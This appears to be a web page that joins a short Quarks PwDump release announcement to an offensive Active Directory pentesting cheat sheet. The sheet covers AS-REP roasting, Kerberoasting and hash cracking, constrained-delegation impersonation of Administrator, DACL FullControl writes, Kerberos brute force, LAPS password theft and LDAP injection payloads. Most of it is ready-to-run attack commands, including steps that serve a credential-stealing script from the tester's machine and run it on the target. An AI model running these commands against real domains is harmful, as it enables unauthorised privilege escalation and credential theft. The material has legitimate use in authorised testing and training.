<p>Writing this tool was not a really difficult challenge, windows hashes and bitlocker information storage methodology are mostly well documented. However it's an interesting project to understand strange Microsoft's implementation and choices for each kind of storage:</p>
<p>High level obfuscation techniques are used for local and domain accounts hashes: many constants, atypical registry value name, useless ciphering layer, hidden constants stored in registry Class attribute,...However, it can be easily defeated.
Used algorithms differ sometimes between windows version and global credentials storage approach isn't regular. We can find exhaustively: <code>RC4, MD5, MD4, SHA-256, AES-256, AES-128 and DES</code>.
Bitlocker information are stored in cleartext in AD domain services.
Project is still in beta test and we would really appreciate to have feedbacks or suggestions/comments about potential bugs.</p>
<p>Binary and source code are available on GitHub (GNU GPL v3 license):</p>
<ul>
<li><a href="https://github.com/quarkslab/quarkspwdump">Quarks PwDump v0.1b</a></li>
</ul>
<p>For NTDS parsing technical details, you can also refer to <code>MISC MAG #59</code> article by Thibault Leveslin. Finally, we would like to greet NTDS hash dump (Csaba Barta), libesedb and creddump authors for their excellent work.</p>
<h1 id="ad-cs-active-directory-certificate-services-pentesting">AD CS (Active Directory Certificate Services) Pentesting</h1>
<p>AD CS is Public Key Infrastructure (PKI) implementation. The misconfiguration of certificate templates can be vulnerable to privilege escalation.</p>
<div class="language-text highlight"><pre><span></span><code>- [kerberos-abuse](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin)
- [adcs-privesc-certificate-templates](https://0xalwayslucky.gitbook.io/cybersecstack/active-directory/adcs-privesc-certificate-templates)
</code></pre></div>
<h2 id="enumeration_1">Enumeration</h2>
<p>We can retrieve certificates information on target Windows machine using <strong><code>certutil</code></strong>.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a># Dump general information
</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a>certutil -dump
</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a>
</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4" href="#__codelineno-90-4"></a># Dump information about certificate authority
</span><span id="__span-90-5"><a id="__codelineno-90-5" name="__codelineno-90-5" href="#__codelineno-90-5"></a>certutil -ca
</span><span id="__span-90-6"><a id="__codelineno-90-6" name="__codelineno-90-6" href="#__codelineno-90-6"></a>certutil -catemplates
</span><span id="__span-90-7"><a id="__codelineno-90-7" name="__codelineno-90-7" href="#__codelineno-90-7"></a>
</span><span id="__span-90-8"><a id="__codelineno-90-8" name="__codelineno-90-8" href="#__codelineno-90-8"></a># List all templates
</span><span id="__span-90-9"><a id="__codelineno-90-9" name="__codelineno-90-9" href="#__codelineno-90-9"></a>certutil -template
</span><span id="__span-90-10"><a id="__codelineno-90-10" name="__codelineno-90-10" href="#__codelineno-90-10"></a># specify the template
</span><span id="__span-90-11"><a id="__codelineno-90-11" name="__codelineno-90-11" href="#__codelineno-90-11"></a>certutil -template ExampleTemplate
</span></code></pre></div>
<p>Then check if <strong><code>Allow Full Control</code></strong> or <strong><code>Allow Write</code></strong> include the group which current user belongs to. If so, we can modify the template and might be able to escalate privilege.</p>
<h3 id="existing-certificates">Existing Certificates</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>Get-ChildItem cert:\
</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a>Get-ChildItem cert:\CurrentUser\
</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3" href="#__codelineno-91-3"></a>Get-ChildItem cert:\CurrentUser\My
</span><span id="__span-91-4"><a id="__codelineno-91-4" name="__codelineno-91-4" href="#__codelineno-91-4"></a>Get-ChildItem cert:\LocalMachine\
</span><span id="__span-91-5"><a id="__codelineno-91-5" name="__codelineno-91-5" href="#__codelineno-91-5"></a>Get-ChildItem cert:\LocalMachine\My
</span></code></pre></div>
<h3 id="extract-certificates">Extract Certificates</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>$cert = Get-ChildItem -Path cert:\CurrentUser\My\&lt;thumbprint&gt;
</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a>Export-Certificate -Cert $cert -FilePath c:\Users\&lt;username&gt;\Desktop\user.cer
</span></code></pre></div>
<h3 id="extract-the-private-key-from-a-certificate">Extract the Private Key from a Certificate</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>$pw = ConvertTo-SecureString &quot;password123&quot; -AsPlainText -Force
</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>$certificate = Get-ChildItem -Path cert:\CurrentUser\My\&lt;thumbprint&gt;
</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a>Export-PfxCertificate -Cert $certificate -FilePath user.pfx -Password $pw
</span></code></pre></div>
<h1 id="as-rep-roasting">AS-REP Roasting</h1>
<p>AS-REP Roasting is a technique that retrieves password hashes that are not required Kerberos preauth in Active Directory.</p>
<h2 id="exploit">Exploit</h2>
<p>Lists users and passwords is not required Kerberos pre auth. Used for ASREPRoasting.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>impacket-GetNPUsers example.local/&lt;username&gt;
</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a>impacket-GetNPUsers -dc-ip &lt;target-ip&gt; example.local/ -no-pass -usersfile users.txt
</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a>impacket-GetNPUsers -dc-ip &lt;target-ip&gt; example.local/&lt;username&gt; -no-pass -format hashcat 
</span><span id="__span-94-4"><a id="__codelineno-94-4" name="__codelineno-94-4" href="#__codelineno-94-4"></a>
</span><span id="__span-94-5"><a id="__codelineno-94-5" name="__codelineno-94-5" href="#__codelineno-94-5"></a># Without authenticatino
</span><span id="__span-94-6"><a id="__codelineno-94-6" name="__codelineno-94-6" href="#__codelineno-94-6"></a>netexec ldap &lt;target-ip&gt; -u users.txt -p &#39;&#39; --asreproast output.txt
</span><span id="__span-94-7"><a id="__codelineno-94-7" name="__codelineno-94-7" href="#__codelineno-94-7"></a># With authentication
</span><span id="__span-94-8"><a id="__codelineno-94-8" name="__codelineno-94-8" href="#__codelineno-94-8"></a>netexec ldap &lt;target-ip&gt; -u username -p password --asreproast output.txt
</span></code></pre></div>
<p>If we find a password hash, crack it.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>john --format=krb5asrep --wordlist=wordlist.txt hash.txt
</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a># or
</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a>hashcat -m 18200 -a 0  hash.txt wordlist.txt
</span></code></pre></div>
<p>Also, we can use it to <strong>Pass-The-Hash</strong> attack.</p>
<h1 id="constrained-delegation-attack">Constrained Delegation Attack</h1>
<p>If a compromised account has the Kerberos Constrained Delegation right, the account may impersonate another user to request Kerberos service ticket and use it for such as signin services.</p>
<h2 id="investigation_1">Investigation</h2>
<h3 id="check-if-kerberos-constrained-delegation-enabled-for-user">Check if Kerberos Constrained Delegation Enabled for User</h3>
<p>Reference: <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation#prerequisites">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation#prerequisites</a></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>Get-NetUser -TrustedToAuth
</span></code></pre></div>
<p><br /></p>
<h2 id="exploit_1">Exploit</h2>
<h3 id="1-request-service-ticket-for-another-user">1. Request Service Ticket for Another User</h3>
<p>The target SPN needs to be allowed for delegation.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a># -k: Use Kerberos Auth
</span><span id="__span-97-2"><a id="__codelineno-97-2" name="__codelineno-97-2" href="#__codelineno-97-2"></a>impacket-getST -k -impersonate Administrator -spn cifs/dc.example.local example.local/UserName
</span></code></pre></div>
<h3 id="2-use-the-service-ticket">2. Use the Service Ticket</h3>
<p>After getting the service ticket, we can use it for further pentesting.<br />
We need to add the environment variable as below:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>export KRB5CCNAME=`pwd`/Administrator.ccache
</span><span id="__span-98-2"><a id="__codelineno-98-2" name="__codelineno-98-2" href="#__codelineno-98-2"></a>
</span><span id="__span-98-3"><a id="__codelineno-98-3" name="__codelineno-98-3" href="#__codelineno-98-3"></a># Check by listing tickets.
</span><span id="__span-98-4"><a id="__codelineno-98-4" name="__codelineno-98-4" href="#__codelineno-98-4"></a># If the klist command not found, install it by `apt install krb5-user`
</span><span id="__span-98-5"><a id="__codelineno-98-5" name="__codelineno-98-5" href="#__codelineno-98-5"></a>klist
</span></code></pre></div>
<ul>
<li>Login to Services with Kerberos Auth</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>    # -k: Use Kerberos Auth
</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a>    # -no-pass: No password
</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a>    impacket-wmiexec example.local/Administrator@example.local -k -no-pass
</span></code></pre></div>
<h1 id="dacl-discretionary-access-control-list-attack">DACL (Discretionary Access Control List) Attack</h1>
<p>DACL is a list of the trustees that are allowed or denied access to objects in Active Directory.</p>
<div class="language-text highlight"><pre><span></span><code>- [dacl](https://www.thehacker.recipes/a-d/movement/dacl)
- [access-control-lists](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists)
</code></pre></div>
<h2 id="add-rights">Add Rights</h2>
<p>We may be able to take a full control of securable objects by getting GenericAll permission on OU (Organizational Unit). </p>
<h3 id="1-ask-tgt-for-kerberos-authentication">1. Ask TGT for Kerberos Authentication</h3>
<p>If we want to use Kerberos authentication for attacking DACL, we need to retrieve a TGT for specific user at first. In addition, to avoid authentication error, we need to synchronize the system time with the domain controller using <code>ntpdate</code> or <code>rdate</code>.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>sudo ntpdate example.local
</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a># or
</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a>sudo rdate -n example.local
</span><span id="__span-100-4"><a id="__codelineno-100-4" name="__codelineno-100-4" href="#__codelineno-100-4"></a>
</span><span id="__span-100-5"><a id="__codelineno-100-5" name="__codelineno-100-5" href="#__codelineno-100-5"></a>impacket-getTGT -dc-ip dc.example.local example.local/username:password
</span></code></pre></div>
<p>The <code>getTGT</code> above dumps a <code>.ccache</code> file which stores TGT.</p>
<p>After dumping the <code>.ccache</code> file, set it to an environment variable for using the later processing.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>export KRB5CCNAME=username.ccache
</span></code></pre></div>
<h3 id="2-read-dacl">2. Read DACL</h3>
<p>We can use <code>Impacket</code>'s  <code>dacledit</code> which has not yet been merged as of 2023/10/21.  </p>
<p>The repository is here: https://github.com/ShutdownRepo/impacket/tree/dacledit</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>dacledit.py -action read -target TestGroup -principal username -dc-ip 10.0.0.1 example.local/username:password
</span><span id="__span-102-2"><a id="__codelineno-102-2" name="__codelineno-102-2" href="#__codelineno-102-2"></a># -use-ldaps: Use LDAPS instead of LDAP
</span><span id="__span-102-3"><a id="__codelineno-102-3" name="__codelineno-102-3" href="#__codelineno-102-3"></a># -k: Use Kerberos authentication
</span><span id="__span-102-4"><a id="__codelineno-102-4" name="__codelineno-102-4" href="#__codelineno-102-4"></a>dacledit.py -action read -target TestGroup -principal username -dc-ip 10.0.0.1 example.local/username:password -use-ldaps -k
</span></code></pre></div>
<h3 id="3-write-dacl">3. Write DACL</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>dacledit.py -action write -rights &#39;FullControl&#39; -principal username -target-dn&#39;OU=SERVICE USERS,DC=EXAMPLE,DC=LOCAL&#39; -inheritance -dc-ip dc.example.local example.local/username:password -use-ldaps -k
</span><span id="__span-103-2"><a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a># -use-ldaps: Use LDAPS instead of LDAP
</span><span id="__span-103-3"><a id="__codelineno-103-3" name="__codelineno-103-3" href="#__codelineno-103-3"></a># -k: Use Kerberos authentication
</span><span id="__span-103-4"><a id="__codelineno-103-4" name="__codelineno-103-4" href="#__codelineno-103-4"></a>dacledit.py -action write -rights &#39;FullControl&#39; -principal username -target-dn&#39;OU=SERVICE USERS,DC=EXAMPLE,DC=LOCAL&#39; -inheritance -dc-ip dc.example.local example.local/username:password -use-ldaps -k
</span></code></pre></div>
<h1 id="download-files-in-windows">Download Files in Windows</h1>
<p>We can download files from websites in Windows from command line, like ‘wget’ command of Linux.</p>
<h2 id="using-invoke-webrequest">Using Invoke-WebRequest</h2>
<p>We can use <code>Invoke-WebRequest</code> command</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a># In PowerShell
</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a>Invoke-WebRequest -Uri https://example.com/hello.txt -Outfile .\hello.txt
</span><span id="__span-104-3"><a id="__codelineno-104-3" name="__codelineno-104-3" href="#__codelineno-104-3"></a>IWR -Uri https://example.com/hello.txt -Outfile .\hello.txt
</span><span id="__span-104-4"><a id="__codelineno-104-4" name="__codelineno-104-4" href="#__codelineno-104-4"></a>
</span><span id="__span-104-5"><a id="__codelineno-104-5" name="__codelineno-104-5" href="#__codelineno-104-5"></a># In CMD, we need to call `powershell` or `powershell.exe` command.
</span><span id="__span-104-6"><a id="__codelineno-104-6" name="__codelineno-104-6" href="#__codelineno-104-6"></a>powershell Invoke-WebRequest -Uri https://example.com/hello.txt -Outfile .\hello.txt
</span><span id="__span-104-7"><a id="__codelineno-104-7" name="__codelineno-104-7" href="#__codelineno-104-7"></a>powershell IWR -Uri https://example.com/hello.txt -Outfile .\hello.txt
</span></code></pre></div>
<h1 id="kerberoasting-attack">Kerberoasting Attack</h1>
<p>Kerberoasting is a attack technique against Kerberos with cracking passwords using a credential already gathered.</p>
<div class="language-text highlight"><pre><span></span><code>- [thehacker.recipes](https://www.thehacker.recipes/a-d/movement/kerberos/kerberoast)
</code></pre></div>
<h2 id="attack">Attack</h2>
<p>If we have a password hash of a user, we might be able to find another user credential using the hash.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>impacket-GetUserSPNs -hashes &lt;lmhash&gt;:&lt;nthash&gt; example.local/username -outputfile hashes.txt
</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a># Without pre-authentication
</span><span id="__span-105-3"><a id="__codelineno-105-3" name="__codelineno-105-3" href="#__codelineno-105-3"></a># -no-preauth: https://github.com/SecureAuthCorp/impacket/pull/1413
</span><span id="__span-105-4"><a id="__codelineno-105-4" name="__codelineno-105-4" href="#__codelineno-105-4"></a>impacket-GetUserSPNs -no-preauth username -usersfile users.txt -dc-host &lt;ip-or-host&gt; example.local/
</span><span id="__span-105-5"><a id="__codelineno-105-5" name="__codelineno-105-5" href="#__codelineno-105-5"></a>
</span><span id="__span-105-6"><a id="__codelineno-105-6" name="__codelineno-105-6" href="#__codelineno-105-6"></a>
</span><span id="__span-105-7"><a id="__codelineno-105-7" name="__codelineno-105-7" href="#__codelineno-105-7"></a>netexec ldap &lt;target-ip&gt; -u username -p password --kerberoasting output.txt
</span><span id="__span-105-8"><a id="__codelineno-105-8" name="__codelineno-105-8" href="#__codelineno-105-8"></a>netexec ldap &lt;target-ip&gt; -u &#39;&#39; -p &#39;&#39; --kerberoasting output.txt
</span></code></pre></div>
<p>After finding hashes, we can crack it or use for pass-the-hash attack.<br />
To crack, run the following commands:</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>john --format=krb5tgs --wordlist=wordlist.txt hash.txt
</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a># or
</span><span id="__span-106-3"><a id="__codelineno-106-3" name="__codelineno-106-3" href="#__codelineno-106-3"></a>hashcat -m 13100 -a 0 hash.txt wordlist.txt
</span></code></pre></div>
<h1 id="kerberos-pentesting">Kerberos Pentesting</h1>
<p>An authentication protocol that is used to verify the identity of a user or host. It uses cryptography for authentication and is consisted of the client, the server, and the Key Distribution Center (KDC). A default port is 88. Kerberos also uses a 464 port for changing passwords.</p>
<h2 id="enumeration_2">Enumeration</h2>
<p>To enumerate automatically, you can use nmap.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>nmap --script krb5-enum-users --script-args krb5-enum-users.realm=&#39;example.local&#39;-p 88 &lt;target-ip&gt;
</span></code></pre></div>
<h3 id="brute-force-authentication">Brute Force Authentication</h3>
<p><strong><a href="https://github.com/ropnop/kerbrute">Kerbrute</a></strong> is a tool to perform Kerberos pre-auth bruteforcing.<br />
The wordlist (e.g. combos.txt) specified must be the "username:password" combinations.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a># -v: verbose mode *it&#39;s recommended to add this flag otherwise we cannot confirm if the user exist or not.
</span><span id="__span-108-2"><a id="__codelineno-108-2" name="__codelineno-108-2" href="#__codelineno-108-2"></a># --dc: domain controller
</span><span id="__span-108-3"><a id="__codelineno-108-3" name="__codelineno-108-3" href="#__codelineno-108-3"></a># -d: domain
</span><span id="__span-108-4"><a id="__codelineno-108-4" name="__codelineno-108-4" href="#__codelineno-108-4"></a># combos.txt: the wordlist specified must be combinations with &quot;username:password&quot;.
</span><span id="__span-108-5"><a id="__codelineno-108-5" name="__codelineno-108-5" href="#__codelineno-108-5"></a>kerbrute bruteforce -v --dc 10.0.0.1 -d example.domain combos.txt
</span><span id="__span-108-6"><a id="__codelineno-108-6" name="__codelineno-108-6" href="#__codelineno-108-6"></a>
</span><span id="__span-108-7"><a id="__codelineno-108-7" name="__codelineno-108-7" href="#__codelineno-108-7"></a># Users enumeration
</span><span id="__span-108-8"><a id="__codelineno-108-8" name="__codelineno-108-8" href="#__codelineno-108-8"></a>kerbrute userenum -v --dc 10.0.0.1 -d example.domain usernames.txt
</span><span id="__span-108-9"><a id="__codelineno-108-9" name="__codelineno-108-9" href="#__codelineno-108-9"></a>
</span><span id="__span-108-10"><a id="__codelineno-108-10" name="__codelineno-108-10" href="#__codelineno-108-10"></a># Brute force user&#39;s password
</span><span id="__span-108-11"><a id="__codelineno-108-11" name="__codelineno-108-11" href="#__codelineno-108-11"></a>kerbture bruteuser -v --dc 10.0.0.1 -d example.domain passwords.txt username
</span></code></pre></div>
<p><br /></p>
<h2 id="as-rep-roasting_1">AS-REP Roasting</h2>
<p>We might be able to find password hashes of user accounts that does not require preauthentication.<br />
Please see <a href="/exploit/windows/active-directory/as-rep-roasting/">AS-REP Roasting</a>.</p>
<p><br /></p>
<h2 id="kerberoasting-attack_1">Kerberoasting Attack</h2>
<p>If we have a password of some user, we might be able to gather another user credential.<br />
Please see <a href="/exploit/windows/active-directory/kerberoasting-attack">Kerberoasting Attack</a>.</p>
<h1 id="laps-local-administrator-password-solution-pentesting">LAPS (Local Administrator Password Solution) Pentesting</h1>
<p>LAPS provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory.</p>
<h2 id="enumeration_3">Enumeration</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>msfconsole
</span><span id="__span-109-2"><a id="__codelineno-109-2" name="__codelineno-109-2" href="#__codelineno-109-2"></a>use post/windows/gather/credentials/enum_laps
</span><span id="__span-109-3"><a id="__codelineno-109-3" name="__codelineno-109-3" href="#__codelineno-109-3"></a>set session 2
</span><span id="__span-109-4"><a id="__codelineno-109-4" name="__codelineno-109-4" href="#__codelineno-109-4"></a>exploit
</span></code></pre></div>
<p><br /></p>
<h2 id="obtain-administrators-password">Obtain Administrator's Password</h2>
<p>First, check if you are in the <strong>LAPS_Readers</strong> group.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>net user &lt;current-username&gt;
</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a># Global Group memberships  *LAPS_Readers
</span></code></pre></div>
<h3 id="using-get-adcomputer">Using Get-ADComputer</h3>
<p><strong>Get-ADComputer</strong> gets the information of the Active Directory computer.</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>Get-ADComputer -Identity &#39;&lt;active-directory-computer-name&gt;&#39; -property &#39;ms-mcs-admpwd&#39;
</span></code></pre></div>
<h3 id="using-get-lapspasswordsps1">Using Get-LAPSPasswords.ps1</h3>
<ol>
<li>
<p><strong>Download the Payload in Local Machine</strong></p>
<p>If you are in LAPS_Readers, you can get the administrator's password using <strong><a href="https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1">Get-LAPSPasswords.ps1</a>{:target="_blank"}{:rel="noopener"}</strong>.</p>
</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>    wget https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1
</span></code></pre></div>
<ol>
<li>
<p><strong>Transfer the Payload to Target Machine</strong></p>
<ul>
<li>
<p><strong>via PowerShell</strong></p>
<p>First off, open web server in local machine.</p>
</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>    python3 -m http.server 8000
</span></code></pre></div>
<div class="language-text highlight"><pre><span></span><code>Then curl in target machine
</code></pre></div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>    curl http://&lt;local-ip&gt;:8000/Get-LAPSPasswords.ps1 -o .\Get-LAPSPasswords.ps1
</span></code></pre></div>
<ul>
<li>
<p><strong>via Evil-WinRM</strong></p>
<p>If you connect the remote Windows machine with Evil-WinRM, you can use directly by adding <strong>-s</strong> flag when connecting.</p>
</li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>    evil-winrm -i &lt;target-ip&gt; -u username -p password -s /path/to/current/directory
</span></code></pre></div>
<div class="language-text highlight"><pre><span></span><code>Then just execute the payload in evil-winrm console.
</code></pre></div>
<div class="language-text highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>    PS &gt; upload .\Get-LAPSPasswords.ps1 c:\Users\&lt;username&gt;\Desktop\Get-LAPSPasswords.ps1
</span></code></pre></div>
</li>
<li>
<p><strong>Execute the Payload in Target Machine</strong></p>
</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a>    .\Get-LAPSPasswords.ps1
</span></code></pre></div>
<h1 id="ldap-injection">LDAP Injection</h1>
<p>LDAP may be vulnerable to query injection if website does not properly validate user input.</p>
<div class="language-text highlight"><pre><span></span><code>- [infosecwriteups.com](https://infosecwriteups.com/for-newbies-simple-examples-of-ldap-injection-vulnerabilities-cbf231431923)
</code></pre></div>
<h2 id="basic-payloads">Basic Payloads</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>(&amp;uid=*)(userPassword=*)
</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2" href="#__codelineno-118-2"></a>(&amp;uid=*)|(userPassword=*)
</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3" href="#__codelineno-118-3"></a>(&amp;uid=*)|(objectClass=*)(userPassword=password123)
</span><span id="__span-118-4"><a id="__codelineno-118-4" name="__codelineno-118-4" href="#__codelineno-118-4"></a>
</span><span id="__span-118-5"><a id="__codelineno-118-5" name="__codelineno-118-5" href="#__codelineno-118-5"></a>*)(uid=*))(|(password=*)
</span></code></pre></div>
<h1 id="ldap-lightweight-directory-access-protocol-pentesting">LDAP (Lightweight Directory Access Protocol) Pentesting</h1>
<p>LDAP is a standard protocol designed to maintain and access "directory services" within a network. Default ports are 389 (LDAP), 636 (LDAPS), 3268 (LDAP connection to Global Catalog), 3269 (LDAP connection to Global Catalog over SSL). </p>
<h2 id="enumeration_4">Enumeration</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a># Nmap
</span><span id="__span-119-2"><a id="__codelineno-119-2" name="__codelineno-119-2" href="#__codelineno-119-2"></a>nmap --script ldap-brute --script-args ldap.base=&#39;&quot;cn=users,dc=cqure,dc=net&quot;&#39; -p 389 &lt;target-ip&gt;
</span><span id="__span-119-3"><a id="__codelineno-119-3" name="__codelineno-119-3" href="#__codelineno-119-3"></a>nmap --script ldap-search -p 389 &lt;target-ip&gt;
</span><span id="__span-119-4"><a id="__codelineno-119-4" name="__codelineno-119-4" href="#__codelineno-119-4"></a>nmap --script ldap-* -p 389 &lt;target-ip&gt;
</span><span id="__span-119-5"><a id="__codelineno-119-5" name="__codelineno-119-5" href="#__codelineno-119-5"></a>nmap --script &quot;ldap* and not brute&quot; -p 389 &lt;target-ip&gt;
</span><span id="__span-119-6"><a id="__codelineno-119-6" name="__codelineno-119-6" href="#__codelineno-119-6"></a>
</span><span id="__span-119-7"><a id="__codelineno-119-7" name="__codelineno-119-7" href="#__codelineno-119-7"></a># NetExec
</span><span id="__span-119-8"><a id="__codelineno-119-8" name="__codelineno-119-8" href="#__codelineno-119-8"></a># -k: Use Kerberos authentication
</span><span id="__span-119-9"><a id="__codelineno-119-9" name="__codelineno-119-9" href="#__codelineno-119-9"></a>netexec ldap &lt;target-ip&gt; -u usernames.txt -p &#39;&#39; -k
</span><span id="__span-119-10"><a id="__codelineno-119-10" name="__codelineno-119-10" href="#__codelineno-119-10"></a># --trusted-for-delegation: Enumerate computers and users with the flag `TRUSTED_FOR_DELEGATION`
</span><span id="__span-119-11"><a id="__codelineno-119-11" name="__codelineno-119-11" href="#__codelineno-119-11"></a># reference: https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties#property-flag-descriptions
</span><span id="__span-119-12"><a id="__codelineno-119-12" name="__codelineno-119-12" href="#__codelineno-119-12"></a>netexec ldap &lt;target-ip&gt; -u username -p password --trusted-for-delegation
</span></code></pre></div>
<p><br /></p>
<h2 id="search-ldap">Search LDAP</h2>
<p>Belows are defined in LDAP.</p>
<ul>
<li><strong>cn - Common Name</strong></li>
<li><strong>dc - Domain Component</strong></li>
<li><strong>ou - Organizational Unit</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a># -x: Simple authentication
</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2" href="#__codelineno-120-2"></a># -b: base dn for search
</span><span id="__span-120-3"><a id="__codelineno-120-3" name="__codelineno-120-3" href="#__codelineno-120-3"></a>ldapsearch -x -H ldap://10.0.0.1 -b &quot;dc=example,dc=com&quot;
</span><span id="__span-120-4"><a id="__codelineno-120-4" name="__codelineno-120-4" href="#__codelineno-120-4"></a>ldapsearch -x -H ldaps://10.0.0.1:636 -b &quot;dc=example,dc=com&quot;
